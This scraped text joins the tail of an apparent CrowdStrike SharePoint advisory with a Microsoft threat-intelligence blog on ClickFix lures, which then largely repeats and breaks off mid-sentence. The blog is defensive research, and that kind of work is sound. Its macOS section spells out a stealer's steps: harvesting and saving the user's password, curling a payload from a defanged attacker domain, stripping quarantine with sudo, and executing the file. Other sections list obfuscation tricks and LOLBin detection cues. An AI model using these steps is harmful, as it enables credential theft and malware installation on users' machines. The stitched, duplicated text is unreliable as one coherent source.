vulnerability exploitation demonstrates how critical application threats can provide attackers with initial access to organizations. CrowdStrike customers benefit from multiple layers of protection against these attacks. While we strongly recommend patching SharePoint instances immediately, the Falcon platform provides comprehensive protection through: Falcon Insight XDR : Behavioral detection and prevention of exploitation attempts Falcon Exposure Management : Visibility into vulnerable SharePoint instances Falcon Next-Gen SIEM : Detection rules for Microsoft IIS logs to identify exploitation attempts CrowdStrike will continue monitoring this threat and update our guidance as new information emerges.

Content types Research Products and services Microsoft Defender Microsoft Defender Experts for XDR Microsoft Defender for Endpoint Microsoft Defender for Office 365 Microsoft Security Experts Topics Threat intelligence Over the past year, Microsoft Threat Intelligence and Microsoft Defender Experts have observed the ClickFix social engineering technique growing in popularity, with campaigns targeting thousands of enterprise and end-user devices globally every day. Since early 2024, we\u2019ve helped multiple customers across various industries address such campaigns attempting to deliver payloads like the prolific Lumma Stealer malware. These payloads affect Windows and macOS devices and typically lead to information theft and data exfiltration. The ClickFix technique attempts to trick users into running malicious commands on their devices by taking advantage of their target\u2019s tendency to solve minor technical issues and other seemingly benign interactions, such as human verification and CAPTCHA checks. It typically gives the users instructions that involve clicking prompts and copying, pasting, and running commands directly in the Windows Run dialog box, Windows Terminal, or Windows PowerShell. It\u2019s often combined with delivery vectors such as phishing, malvertising, and drive-by compromises, most of which even impersonate legitimate brands and organizations to further reduce suspicion from their targets. Because ClickFix relies on human intervention to launch the malicious commands, a campaign that uses this technique could get past conventional and automated security solutions. Organizations could thus reduce the impact of this technique by educating users in recognizing its lures and by implementing policies that will harden the device configurations in their environment (for example, disallowing users to use the Run dialog if it\u2019s not necessary in their daily tasks). Microsoft Defender XDR also provides a comprehensive set of protection features that detect this threat at various stages of the attack chain. This blog discusses the different elements that make up a ClickFix campaign\u2014from the arrival vectors it comes with to its various implementations\u2014and provides different examples of threat campaigns we\u2019ve observed to further illustrate these elements. We also provide recommendations and detection details to surface and mitigate this threat. The ClickFix attack chain Before the click: Arrival vectors Inside the click: ClickFix implementations The \u201cfix\u201d: User-level code execution Beyond Windows: ClickFix targeting macOS users Behind the click: ClickFix kits and other services for sale ClickFix protection and detection The ClickFix attack chain A typical ClickFix attack begins with threat actors using phishing emails, malvertisements, or compromised websites to lead unsuspecting users to a visual lure\u2014usually a landing page\u2014and trick them into executing a malicious command themselves. By adding this user interaction element in the attack chain, a threat using the ClickFix technique could slip through conventional and automated security solutions. Microsoft Threat Intelligence observed threat actors adapting and improving certain elements of the technique to further evade detection. For example, threat actors obfuscate the JavaScript that generates the visual lures or they download parts of the code from different servers. They also employ various tactics in obfuscating malicious commands. We discuss these stages of the attack chain in detail in the succeeding sections of this blog. Once the malicious command is run by the user, malware is downloaded into the target device. We\u2019ve observed numerous threat actors that leverage ClickFix attacks deliver the following: Infostealers like LummaStealer , which appears to be the most prolific ClickFix final payload based on our observations and threat hunting investigations Remote access tools (RATs) such as Xworm, AsyncRAT, NetSupport, and SectopRAT, which could allow threat actors to conduct hands-on keyboard activity like discovery, lateral movement, and persistence Loaders like Latrodectus and MintsLoader, which could deliver additional malware and other payloads Rootkits, such as a modified version of the open source r77, which could allow threat actors to employ several sophisticated persistence and defense evasion tactics and remain deeply embedded in a victim system These final payloads are often \u201cfileless\u201d, that is, they\u2019re seldom written to disk as a Windows executable ( .exe or .dll ) file. Instead, they\u2019re loaded and launched in memory by living-off-the-land binaries (LOLBins), often as a .NET assembly or Common Language Runtime (CLR) module. However, whether the malware is on disk or in memory, we\u2019ve observed its code injected into LOLBins, such as msbuild.exe , regasm.exe , or powershell.exe . Figure 1. The typical ClickFix attack chain Case study: Lampion malware campaign To illustrate a typical ClickFix attack chain, let\u2019s look at a campaign we first identified in May 2025 targeting Portuguese organizations in government, finance, and transportation sectors to deliver Lampion malware, an infostealer focused on banking information. This campaign has since been observed in other countries\u2014including Portugal, Switzerland, Luxembourg, France, Hungary, and Mexico\u2014targeting organizations in the government, education, transportation, and financial services industries. As of June 2025, this campaign remains active. The Lampion malware campaign\u2019s ClickFix lures, obfuscation methods, and multi-stage infection process are designed to evade detection: The threat actor sends phishing emails containing a ZIP file, which when opened, contains an HTML file that redirects target users to a fake Portuguese tax authority site where the ClickFix lure is hosted. The ClickFix lure tricks users into launching a PowerShell command that downloads an obfuscated VBScript ( .vbs ). The downloaded script then writes a second obfuscated .vbs file to the Windows %TEMP% directory and schedules it to run later using a hidden task. This second .vbs file downloads a third and much larger .vbs file that performs reconnaissance, checks for antivirus or sandbox environments, and sends system data to a command-and-control (C2) server. The third script also creates a .cmd file in the Windows startup folder, naming it after the user\u2019s hostname, and schedules a system restart. After the device restarts, the .cmd file launches a large DLL through rundll32.exe and attempts to deliver the final payload. However, during our investigation, the actual Lampion malware wasn\u2019t delivered because the download command was commented out of the code. Figure 2. Lampion infection chain Before the click: Arrival vectors Threat actors leveraging ClickFix rely on a variety of methods to lure unwitting users. We\u2019ve observed three primary avenues where a user could encounter a ClickFix prompt: by receiving phishing emails, encountering a malicious ad, or by visiting a compromised or malicious website. Phishing Microsoft Threat Intelligence first observed the use of the ClickFix technique between March and June 2024 in email campaigns sent by a threat actor we track as Storm-1607. These emails contained HTML attachments that attempted to install DarkGate, a commodity loader that is capable of keylogging, cryptocurrency mining, establishing C2 communications, and downloading additional malicious payloads, among others. One of Storm-1607\u2019s campaigns observed in May 2024 consisted of tens of thousands of emails targeting organizations in the United States (US) and Canada. These emails used payment and invoice lures and contained attachments with file names like reports_528647.html : Figure 3. Storm-1607 phishing email When opened, the HTML loaded a page with a fake Microsoft Word new document image and a dialog box showing an error message and prompting the user to click the How to fix button: Figure 4. HTML attachment displaying a Microsoft Word background and ClickFix lure Clicking the button copied the malicious code on the user\u2019s clipboard in the background. Meanwhile, the dialog box added new instructions that explained to the user how to open Windows Terminal and paste the malicious code into it: Figure 5. ClickFix lure displaying further instructions While other threat actors also use invoice or payment lures in their phishing campaigns, as of this writing, including HTML attachments in the emails is no longer the preferred method to implement the ClickFix technique. Instead, threat actors now include in their phishing email a URL that points to a ClickFix landing page. For example, in March 2025, we observed a threat actor tracked as Storm-0426 launch a campaign consisting of thousands of phishing emails that targeted users in Germany and attempted to install MintsLoader. The emails used payment and invoice lures purportedly from a web hosting provider and contained URLs leading to the Prometheus traffic direction system (TDS) hosted on numerous compromised sites: Figure 6. Storm-0426 phishing email The TDS redirected users to the attacker-controlled website mein-lonos-cloude[.]de , where the ClickFix technique instructed the users to complete a human verification process by following the displayed instructions, which launched a malicious code: Figure 7. ClickFix landing page Another example of a phishing campaign using URLs and redirectors was observed in June 2025, where the campaign impersonated the US Social Security Administration (SSA) and used a combination of social engineering and domain spoofing to deliver ScreenConnect, a legitimate remote management tool that has become increasingly abused by threat actors. Once installed, ScreenConnect could give an attacker full remote control over a victim\u2019s system, enabling them to exfiltrate data, install additional malware, or conduct surveillance. The campaign began with emails sent from a legitimate but compromised Brazilian domain. The message, which even included legitimate links to SSA\u2019s official social media accounts in the footer, claimed that there was an issue with the recipient\u2019s social security statement. Like other phishing emails, these characteristics and tactics were all attempts by the threat actor to bypass spam filters, lend credibility and reduce suspicion to the message, and prompt the user to take immediate action: Figure 8. Phishing email impersonating the US SSA The message\u2019s call-to-action button, labeled Download Statement , was also particularly deceptive because instead of linking directly to a malicious site, it used a Google Ads URL redirect to obfuscate the final destination. This technique not only helped the email pass through conventional email security solutions, it also undermined an email best practice (hovering over the links before clicking to determine if the URL displayed points to the intended site or not) users are typically taught as part of their security awareness trainings. When a user clicked the Download Statement button, they were redirected to a spoofed SSA website hosted on a Spanish top-level domain ( access-ssa-gov[.]es ). The site closely mimicked the real SSA home page, including a blurred background image of the legitimate site to create a false sense of familiarity and trust: Figure 9. ClickFix landing page impersonating the US SSA The landing page presented the user with a CAPTCHA human verification pop-up, which was part of the ClickFix technique. Behind the scenes, this interaction triggered a series of fake verification steps designed to guide the user into running a PowerShell script that would eventually download and launch the ScreenConnect payload: Figure 10. ClickFix instructions from the spoofed US SSA domain Malvertising Malvertising is another popular delivery method that leads to ClickFix landing pages. In a campaign observed in April 2025, users who attempted to stream free or pirated movies on certain websites inadvertently launched a variety of scam pages in a new browser tab when they interacted with a movie (for example, by pressing the play button): Figure 11. Example of a free movie streaming website One of these scam pages was a ClickFix landing page that downloaded and installed Lumma Stealer: Figure 12. ClickFix landing page the users were redirected to if they clicked the \u201cPlay\u201d button on the free movie website This activity cluster is notable because it renamed the various intermediate HTA scripts to media format extensions such as .mp3 , .mp4 , or .ogg . It\u2019s also notable for its high traffic volumes: in a single day, tens of thousands, if not hundreds of thousands, of unique visitors could be funneled to scam pages (including the ClickFix landing page) through the malvertising redirectors. Drive-by compromise Some threat actors have also been observed to leverage compromised websites to deliver the ClickFix landing page. For example, the threat actor we track as Storm-0249 has traditionally used email to deliver Latrodectus or other initial access malware\u2014whether by using PDF files or URL links (sometimes copyright infringement -themed). However, since the beginning of March 2025, Storm-0249 switched to compromising legitimate websites, potentially through WordPress vulnerabilities, and using the ClickFix technique to deliver its payloads. When a user visits the compromised site, the original page is briefly displayed before it\u2019s replaced with the ClickFix human verification lure. This specific lure even spoofs Cloudflare to further trick users into thinking that the verification step is legitimate: Figure 13. ClickFix lure spoofing Cloudflare Turnstile on a compromised site Inside the click: ClickFix implementations ClickFix operators use several methods to attempt to convince a target to perform user-level command execution on their system. Early landing pages mimicked Google\u2019s \u201c Aw, Snap! \u201d crash error or Word Online extension missing message (as depicted in Figure 4), while recent ones spoof Google\u2019s reCAPTCHA and Cloudflare\u2019s Turnstile solution. We\u2019ve even observed threat actors spoof social media platforms like Discord to trick users into believing they\u2019re joining an actual Discord server. Many elements go into building ClickFix lure pages\u2014from JavaScript inline frames (iframes) and HTML href codes to cascading style sheets (CSS) resources\u2014to make them more legitimate-looking. There are various ways that ClickFix is implemented: some implementations are contained in one file or page, while others use remote resources. Some threat actors leave code comments amateurishly while others obfuscate their code. There are even implementations that report the status of an infection to a Telegram channel or a web server. We provide a few examples of these implementations and discuss their inner workings. Impersonating Cloudflare Turnstile Figure 14 shows a partial screenshot of a ClickFix landing page, binancepizza[.]info , displaying a seemingly legitimate Cloudflare Turnstile verification process that a user is lured to interact with before they can supposedly access the site: Figure 14. The ClickFix landing page binancepizza[.]info Its HTML source code clones this Cloudflare Turnstile style page using a href attribute to a CSS resource hosted by the Font Awesome library: Figure 15. HTML code highlighting a CSS resource for a Cloudflare verification prompt The page also references an HTML file ( field.html ) using a hidden iframe: Figure 16. HTML code highlighting hidden iframe and text needing to \u201cverify\u201d Within field.html , we see in Figure 17 that contentEl is the iframe element representing the fake Cloudflare Turnstile verification check box. When a user ticks the Verify you are human check box, this script animates a fake spinner through runVerification() and sends postMessage(\u201ctrigger\u201d) to the parent window (the main landing page). Figure 17. JavaScript code of iframe field.html, highlighting elements that send a trigger message upon verification click The user is then presented with the ClickFix instructions (Figure 18), while the obfuscated command is copied to the user\u2019s clipboard (Figure 19): Figure 18. ClickFix instructions from binancepizza[.]info Figure 19. Malicious command copied to clipboard Figure 20 shows that the clipboard copy occurs once the code receives the message \u201ctrigger\u201d, which is sent by the field.html hidden iframe. Once that message is received, the script uses navigator.clipboard.writeText(codeToCopy) to copy the command to the clipboard. Figure 20. JavaScript code highlighting the method navigator.clipboard.writeText, which copies a malicious command to clipboard Impersonating social platforms It\u2019s important to note that not all ClickFix landing pages are designed in the same manner and might not strictly contain the elements discussed previously. In some instances, threat actors also mimic popular social platforms to broaden their reach of potential targets. Figure 21 shows a ClickFix landing page spoofing a Discord server supposedly needing to verify a user before they can join: Figure 21. Fake Discord server landing page implementing ClickFix. In this page\u2019s source code (Figure 22), we can see it referencing the Discord logo image file to appear legitimate. Additionally, the addEventListener method waits for the Verify button to get clicked (through verifyBtn ) so navgiator.clipboard.writetext(command) can copy the malicious command to the user\u2019s clipboard. This JavaScript method is a Clipboard API that allows for accessing the operating system (OS) clipboard. Older pages might use document.execCommand() , which is now deprecated. The fake Discord landing page differs from the previous example because the reference of an external trigger (from the hidden iframe) isn\u2019t used here. Instead, the click then copy is all processed from the main window. Based on our analysis, this landing page also appears to be part of the OBSCURE#BAT campaign delivering r77 rootkit. Figure 22. HTML code highlighting use of Discord logo and JavaScript elements that copy a malicious command to clipboard upon clicking \u201cverify\u201d The \u201cfix\u201d: User-level code execution The ClickFix technique typically presents its \u201cfix\u201d by instructing users to run malicious commands or code in the Windows Run dialog box. We assess that the threat actors who use this technique are banking on the idea that most of their targets aren\u2019t familiar with this Windows OS component and what it\u2019s used for, unlike the more advanced users doing system administrator tasks. Early ClickFix lures instructed users to run commands manually and directly in Windows Terminal or Windows PowerShell. However, multiple line warnings might have deterred potential victims from running these commands, leading to the threat actors changing their tactics. Figure 23. Example of a multiple line warning in Windows Terminal Detecting Windows Run dialog misuse The Windows Run dialog ( Win + R ) is a trusted shell input user interface (UI) that\u2019s part of Windows Explorer ( explorer.exe ). Internally, it uses ShellExecute or CreateProcess APIs to resolve and launch commands. The input is limited to MAX_PATH , requiring a null-terminated string ( \\0 ) with a practical maximum of 259 characters. Additionally, as part of the Run dialog, Windows loads tiptsf.dll module in explorer.exe . This DLL file is related to the Text Services Framework (TSF), which provides input processor interface. Figure 24. The Windows Run dialog box Entering commands into the Run dialog leaves forensic traces\u2014most notably in the RunMRU (Most Recently Used) registry key. This key keeps a history of Run dialog executions and can be used to reconstruct user-initiated activity during investigations. Note that it doesn\u2019t create a registry entry if the process execution fails. Figure 25. RunMRU registry key entry with a malicious ClickFix command To determine if a ClickFix command execution is potentially occurring in the environment, one can check the RunMRU entries if they include signs pointing to LOLBins\u2014such as powershell , mshta , rundll32 , wscript , curl , and wget \u2014that can execute code and/or download payloads. PowerShell continues to be the most leveraged native binary, with cmdlets such as iwr ( Invoke-WebRequest ), irm ( Invoke-RestMethod ), and iex ( Invoke-Expression ) being very prolific. Additional suspicious elements to check in entries within the RunRMU registry key include the following: First-stage payloads are often hosted by direct IP addresses, content delivery network (CDN) domains, interesting top-level domains (for example, .live , . shop , .icu ), or code-sharing platforms such as pastes. First-stage payloads are often delivered and/or launched as specific file type such as .html , .hta , .txt , .zip , .msi , .bat , .ps1 , or .vbs The file type of the scripts might be renamed to media extensions (such as .png , .mp3 , .mp4 , .wav , and .jpg ) to hide their true intent. The file type might employ double file extension for evasion (for example, file.hta.mp4 ) URLs are often shortened using shorteners such as Bitly. A fake reCAPTCHA, CAPTCHA, or Turnstile confirmation is included, such as the following: \u2705 \u201cI am not a robot \u2013 reCAPTCHA Verification ID: XXXX\u201d # # I am not a robot: CAPTCHA Verification UID: XXXX\\ # \u201cHuman, not a robot: CAPTCHA: Verification ID: XXXX\u201d \u2714\ufe0f \u201cCloud identificator:XXXX\u201d Figure 26. Examples of generic ClickFix commands Obfuscation and execution techniques for defense evasion The command examples in the previous section aren\u2019t all encompassing, as we\u2019ve observed threat actors employing a growing number of obfuscation and execution techniques for defense evasion. These techniques include nested execution chains, proxy command abuse, encoding schemes such as Base64, use of string concatenation/fragmentation, and escaped characters, among others. Figure 27. Example of a ClickFix command that was using nested PowerShell, string obfuscation through concatenated ampersand (\u201c&\u201d) delimiters, and benign sounding phrase (for example, \u201cMicrosoft Defender Services Secure Access\u201d) Figure 28. Example of a ClickFix command that was using LOLBIN stacking (repeated cmd.exe) and obfuscation through escape characters (^) Figure 29. Example of a ClickFix command that was obfuscated using string splitting and concatenation, indexed character access through the $1 command string, and ampersand execution Beyond Windows: ClickFix targeting macOS users In June 2025, a ClickFix campaign was reported to be targeting macOS users to deliver Atomic macOS Stealer (AMOS). This new campaign is yet another mark in the continuously evolving threat landscape, as the ClickFix technique was previously observed to be more common in Windows-based attacks. The campaign, which according to our analysis goes back to late May 2025, redirected target users to Clickfix-themed delivery websites that were impersonating Spectrum, a US-based company that provides services for cable television, internet access, and unified communications: Figure 30. ClickFix landing page with a fake CAPTCHA Like any other ClickFix campaign, when the user clicks the Alternate verification button, the page displays instructions the user has to follow to \u201cfix\u201d their issue. Interestingly, the steps the lure displays even on macOS users are for Windows devices: Figure 31. ClickFix instructions presented to the target user Meanwhile, in the background, a malicious command is copied to the user\u2019s clipboard. The command that is copied is different for macOS and Windows devices. Windows: Figure 32. Screenshot of the ClickFix command copied on Windows devices macOS: Figure 33. Screenshot of the ClickFix command copied on macOS devices The command that\u2019s copied for macOS devices instructs the system to perform the following actions: Get current user: username=$(whoami) Prompt for the correct password: Continuously prompt System Password: until the user enters the correct password Validate password: Use dscl . -authonly to verify the password against macOS directory services Store password: Save the valid password to the /tmp/.pass file Download payload: curl -o /tmp/update hxxps[:]//applemacios[.]com/getrur/update Remove quarantine: Use the stolen password with sudo -S xattr -c to bypass macOS security Make an executable file: chmod +x /tmp/update Launch the malware: Run the downloaded file /tmp/update The file saved as update within the tmp directory belongs to the AMOS malware family. AMOS variants such as Poseidon and Odyssey are known to steal user information, including browser cookies, passwords, and cryptocurrency wallet credentials. Behind the click: ClickFix kits and other services for sale Microsoft Threat Intelligence has observed several threat actors selling the ClickFix builders (also called \u201cWin + R\u201d) on popular hacker forums since late 2024. Some of these actors are bundling ClickFix builders into their existing kits that already generate various files such as LNK, JavaScript, and SVG files. The kits offer creation of landing pages with a variety of available lures including Cloudflare. They also offer construction of malicious commands that users will paste into the Windows Run dialog. These kits claim to guarantee antivirus and web protection bypass (some even promise that they can bypass Microsoft Defender SmartScreen ), as well as payload persistence. The cost of subscription to such a service might be between US$200 to US$1,500 per month. We\u2019ve also discovered sellers that offer one-time and piece-meal solutions (for example, only the source code, landing page, or the command line) priced anywhere between US$200 and US$500. Figures 34 and 35 show an example of a ClickFix builder that offers a variety of configurable options such as: Displaying a decoy PDF file after a target user is phished Payload execution timing Virtual machine (VM) detection and evasion (\u201cAnti VM\u201d) and user access control (UAC) bypass Visual template to be used, such as Google Meet, Google CAPTCHA, or Cloudflare Language to be used, for example, English, German, Spanish, French, Italian, or Portuguese Figure 34. Screenshot of a ClickFix builder, taken from the seller\u2019s demo video Figure 35. Another screenshot of a ClickFix builder, taken from the seller\u2019s demo video ClickFix protection and detection Microsoft Defender XDR offers comprehensive coverage for ClickFix attacks by leveraging a range of available technologies across different attack layers. For example, Microsoft Defender SmartScreen displays a warning to Microsoft Edge users when they visit a ClickFix landing page: Figure 36. Microsoft Defender SmartScreen flagging a ClickFix landing page Even if a user chooses to bypass the SmartScreen warning or is using a different web browser and is socially engineered to execute a command in the Run dialog, Microsoft Defender for Endpoint detects and mitigates the attacks initial access activities like the suspicious process execution and command-line activity during the process scan phase. Most attack paths eventually lead to the execution of either PowerShell or HTA scripts. Microsoft\u2019s Antimalware Scan Interface (AMSI) provides scanning capabilities for both scripting environments and PowerShell applications. Defender\u2019s Cloud Protection delivers enhanced protection by monitoring and intercepting outgoing connections to malicious URLs as well as analyzing process execution patterns. Additionally, Microsoft Defender for Office 365 analyzes end-to-end links and HTML attachments, and has fake CAPTCHA behavioral signatures that proactively block ClickFix-related phishing emails. Additional attack chain coverage with network protection In early 2025, Microsoft Defender Experts observed thousands of devices being affected by a ClickFix attack (that is, the ClickFix command was executed by a user on the device) per month, even with an endpoint detection and response (EDR) solution enabled. Due to this, our researchers performed pattern-of-life analysis to follow the tactics, techniques, and procedures (TTPs) in the attack timeline and understand the gaps that can be filled so that the attack could be stopped at the initial access stage. Their research resulted in the automation of the analysis and collection of numerous obfuscated/encoded LOLBin commands observed in the RunMRU registry, and they were able to successfully extract and block newly created malicious domainsthrough Defender for Endpoint\u2019s network protection feature . This feature is an important component on the protection against ClickFix because blocking the C2 domains early in the attack chain prevents the download and/or execution of first-stage payloads, effectively making the attack unsuccessful. Recommendations Microsoft Threat Intelligence recommends the following mitigations to reduce the impact of this threat. Educate users to identify social engineering attacks. Ensure users are aware of what they copy and paste. Check your Microsoft 365 email filtering settings to ensure spoofed emails, spam, and emails with malware are blocked. Use Microsoft Defender for Office 365 for enhanced phishing protection and coverage against new threats and polymorphic variants. Configure Defender for Office 365 to recheck links on click and delete sent mail in response to newly acquired threat intelligence. Turn on safe attachments policies to check attachments to inbound email. Consider using enterprise-managed browsers , which provide multiple security features including security update requirements and data compliance policies . Block web pages from automatically running Flash plugins. Enable network protection and web protection in Microsoft Defender for Endpoint to safeguard against malicious sites and internet-based threats. Encourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen , which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware. Turn on cloud-delivered protection in Microsoft Defender Antivirus, or the equivalent for your antivirus product, to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants. Enable PowerShell script block logging to detect and analyze obfuscated or encoded commands, providing visibility into malicious script execution that might otherwise evade traditional logging. Use PowerShell execution policies such as setting AllSigned or RemoteSigned tohelp reduce the risk of malicious execution by ensuring only trusted, signed scripts are executed, adding a layer of control. Use Group Policy to deploy hardening configurations throughout your environment, if certain features are not necessary: Disable the Run dialog box ( Win + R ) key and remove the Run option from the Start Menu by selecting User Configuration > Administrative Templates > Start Menu and Taskbar > Remove Run menu from Start Menu . Create an App Control policy that prohibits the launch of native Windows binaries from Run . This can be accomplished by defining a rule based on the specific process that is launching binaries like PowerShell. Configure Windows Terminal access and settings to warn users when the text they\u2019re pasting contains multiple lines . Microsoft Defender XDR customers can also implement the following attack surface reduction rules to harden an environment against PowerShell techniques used by threat actors: Block execution of potentially obfuscated scripts Block executable files from running unless they meet a prevalence, age, or trusted list criterion Block JavaScript or VBScript from launching downloaded executable content Microsoft Defender XDR detections Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.

Content types Research Products and services Microsoft Defender Microsoft Defender Experts for XDR Microsoft Defender for Endpoint Microsoft Defender for Office 365 Microsoft Security Experts Topics Threat intelligence Over the past year, Microsoft Threat Intelligence and Microsoft Defender Experts have observed the ClickFix social engineering technique growing in popularity, with campaigns targeting thousands of enterprise and end-user devices globally every day. Since early 2024, we\u2019ve helped multiple customers across various industries address such campaigns attempting to deliver payloads like the prolific Lumma Stealer malware. These payloads affect Windows and macOS devices and typically lead to information theft and data exfiltration. The ClickFix technique attempts to trick users into running malicious commands on their devices by taking advantage of their target\u2019s tendency to solve minor technical issues and other seemingly benign interactions, such as human verification and CAPTCHA checks. It typically gives the users instructions that involve clicking prompts and copying, pasting, and running commands directly in the Windows Run dialog box, Windows Terminal, or Windows PowerShell. It\u2019s often combined with delivery vectors such as phishing, malvertising, and drive-by compromises, most of which even impersonate legitimate brands and organizations to further reduce suspicion from their targets. Because ClickFix relies on human intervention to launch the malicious commands, a campaign that uses this technique could get past conventional and automated security solutions. Organizations could thus reduce the impact of this technique by educating users in recognizing its lures and by implementing policies that will harden the device configurations in their environment (for example, disallowing users to use the Run dialog if it\u2019s not necessary in their daily tasks). Microsoft Defender XDR also provides a comprehensive set of protection features that detect this threat at various stages of the attack chain. This blog discusses the different elements that make up a ClickFix campaign\u2014from the arrival vectors it comes with to its various implementations\u2014and provides different examples of threat campaigns we\u2019ve observed to further illustrate these elements. We also provide recommendations and detection details to surface and mitigate this threat. The ClickFix attack chain Before the click: Arrival vectors Inside the click: ClickFix implementations The \u201cfix\u201d: User-level code execution Beyond Windows: ClickFix targeting macOS users Behind the click: ClickFix kits and other services for sale ClickFix protection and detection The ClickFix attack chain A typical ClickFix attack begins with threat actors using phishing emails, malvertisements, or compromised websites to lead unsuspecting users to a visual lure\u2014usually a landing page\u2014and trick them into executing a malicious command themselves. By adding this user interaction element in the attack chain, a threat using the ClickFix technique could slip through conventional and automated security solutions. Microsoft Threat Intelligence observed threat actors adapting and improving certain elements of the technique to further evade detection. For example, threat actors obfuscate the JavaScript that generates the visual lures or they download parts of the code from different servers. They also employ various tactics in obfuscating malicious commands. We discuss these stages of the attack chain in detail in the succeeding sections of this blog. Once the malicious command is run by the user, malware is downloaded into the target device. We\u2019ve observed numerous threat actors that leverage ClickFix attacks deliver the following: Infostealers like LummaStealer , which appears to be the most prolific ClickFix final payload based on our observations and threat hunting investigations Remote access tools (RATs) such as Xworm, AsyncRAT, NetSupport, and SectopRAT, which could allow threat actors to conduct hands-on keyboard activity like discovery, lateral movement, and persistence Loaders like Latrodectus and MintsLoader, which could deliver additional malware and other payloads Rootkits, such as a modified version of the open source r77, which could allow threat actors to employ several sophisticated persistence and defense evasion tactics and remain deeply embedded in a victim system These final payloads are often \u201cfileless\u201d, that is, they\u2019re seldom written to disk as a Windows executable ( .exe or .dll ) file. Instead, they\u2019re loaded and launched in memory by living-off-the-land binaries (LOLBins), often as a .NET assembly or Common Language Runtime (CLR) module. However, whether the malware is on disk or in memory, we\u2019ve observed its code injected into LOLBins, such as msbuild.exe , regasm.exe , or powershell.exe . Figure 1. The typical ClickFix attack chain Case study: Lampion malware campaign To illustrate a typical ClickFix attack chain, let\u2019s look at a campaign we first identified in May 2025 targeting Portuguese organizations in government, finance, and transportation sectors to deliver Lampion malware, an infostealer focused on banking information. This campaign has since been observed in other countries\u2014including Portugal, Switzerland, Luxembourg, France, Hungary, and Mexico\u2014targeting organizations in the government, education, transportation, and financial services industries. As of June 2025, this campaign remains active. The Lampion malware campaign\u2019s ClickFix lures, obfuscation methods, and multi-stage infection process are designed to evade detection: The threat actor sends phishing emails containing a ZIP file, which when opened, contains an HTML file that redirects target users to a fake Portuguese tax authority site where the ClickFix lure is hosted. The ClickFix lure tricks users into launching a PowerShell command that downloads an obfuscated VBScript ( .vbs ). The downloaded script then writes a second obfuscated .vbs file to the Windows %TEMP% directory and schedules it to run later using a hidden task. This second .vbs file downloads a third and much larger .vbs file that performs reconnaissance, checks for antivirus or sandbox environments, and sends system data to a command-and-control (C2) server. The third script also creates a .cmd file in the Windows startup folder, naming it after the user\u2019s hostname, and schedules a system restart. After the device restarts, the .cmd file launches a large DLL through rundll32.exe and attempts to deliver the final payload. However, during our investigation, the actual Lampion malware wasn\u2019t delivered because the download command was commented out of the code. Figure 2. Lampion infection chain Before the click: Arrival vectors Threat actors leveraging ClickFix rely on a variety of methods to lure unwitting users. We\u2019ve observed three primary avenues where a user could encounter a ClickFix prompt: by receiving phishing emails, encountering a malicious ad, or by visiting a compromised or malicious website. Phishing Microsoft Threat Intelligence first observed the use of the ClickFix technique between March and June 2024 in email campaigns sent by a threat actor we track as Storm-1607. These emails contained HTML attachments that attempted to install DarkGate, a commodity loader that is capable of keylogging, cryptocurrency mining, establishing C2 communications, and downloading additional malicious payloads, among others. One of Storm-1607\u2019s campaigns observed in May 2024 consisted of tens of thousands of emails targeting organizations in the United States (US) and Canada. These emails used payment and invoice lures and contained attachments with file names like reports_528647.html : Figure 3. Storm-1607 phishing email When opened, the HTML loaded a page with a fake Microsoft Word new document image and a dialog box showing an error message and prompting the user to click the How to fix button: Figure 4. HTML attachment displaying a Microsoft Word background and ClickFix lure Clicking the button copied the malicious code on the user\u2019s clipboard in the background. Meanwhile, the dialog box added new instructions that explained to the user how to open Windows Terminal and paste the malicious code into it: Figure 5. ClickFix lure displaying further instructions While other threat actors also use invoice or payment lures in their phishing campaigns, as of this writing, including HTML attachments in the emails is no longer the preferred method to implement the ClickFix technique. Instead, threat actors now include in their phishing email a URL that points to a ClickFix landing page. For example, in March 2025, we observed a threat actor tracked as Storm-0426 launch a campaign consisting of thousands of phishing emails that targeted users in Germany and attempted to install MintsLoader. The emails used payment and invoice lures purportedly from a web hosting provider and contained URLs leading to the Prometheus traffic direction system (TDS) hosted on numerous compromised sites: Figure 6. Storm-0426 phishing email The TDS redirected users to the attacker-controlled website mein-lonos-cloude[.]de , where the ClickFix technique instructed the users to complete a human verification process by following the displayed instructions, which launched a malicious code: Figure 7. ClickFix landing page Another example of a phishing campaign using URLs and redirectors was observed in June 2025, where the campaign impersonated the US Social Security Administration (SSA) and used a combination of social engineering and domain spoofing to deliver ScreenConnect, a legitimate remote management tool that has become increasingly abused by threat actors. Once installed, ScreenConnect could give an attacker full remote control over a victim\u2019s system, enabling them to exfiltrate data, install additional malware, or conduct surveillance. The campaign began with emails sent from a legitimate but compromised Brazilian domain. The message, which even included legitimate links to SSA\u2019s official social media accounts in the footer, claimed that there was an issue with the recipient\u2019s social security statement. Like other phishing emails, these characteristics and tactics were all attempts by the threat actor to bypass spam filters, lend credibility and reduce suspicion to the message, and prompt the user to take immediate action: Figure 8. Phishing email impersonating the US SSA The message\u2019s call-to-action button, labeled Download Statement , was also particularly deceptive because instead of linking directly to a malicious site, it used a Google Ads URL redirect to obfuscate the final destination. This technique not only helped the email pass through conventional email security solutions, it also undermined an email best practice (hovering over the links before clicking to determine if the URL displayed points to the intended site or not) users are typically taught as part of their security awareness trainings. When a user clicked the Download Statement button, they were redirected to a spoofed SSA website hosted on a Spanish top-level domain ( access-ssa-gov[.]es ). The site closely mimicked the real SSA home page, including a blurred background image of the legitimate site to create a false sense of familiarity and trust: Figure 9. ClickFix landing page impersonating the US SSA The landing page presented the user with a CAPTCHA human verification pop-up, which was part of the ClickFix technique. Behind the scenes, this interaction triggered a series of fake verification steps designed to guide the user into running a PowerShell script that would eventually download and launch the ScreenConnect payload: Figure 10. ClickFix instructions from the spoofed US SSA domain Malvertising Malvertising is another popular delivery method that leads to ClickFix landing pages. In a campaign observed in April 2025, users who attempted to stream free or pirated movies on certain websites inadvertently launched a variety of scam pages in a new browser tab when they interacted with a movie (for example, by pressing the play button): Figure 11. Example of a free movie streaming website One of these scam pages was a ClickFix landing page that downloaded and installed Lumma Stealer: Figure 12. ClickFix landing page the users were redirected to if they clicked the \u201cPlay\u201d button on the free movie website This activity cluster is notable because it renamed the various intermediate HTA scripts to media format extensions such as .mp3 , .mp4 , or .ogg . It\u2019s also notable for its high traffic volumes: in a single day, tens of thousands, if not hundreds of thousands, of unique visitors could be funneled to 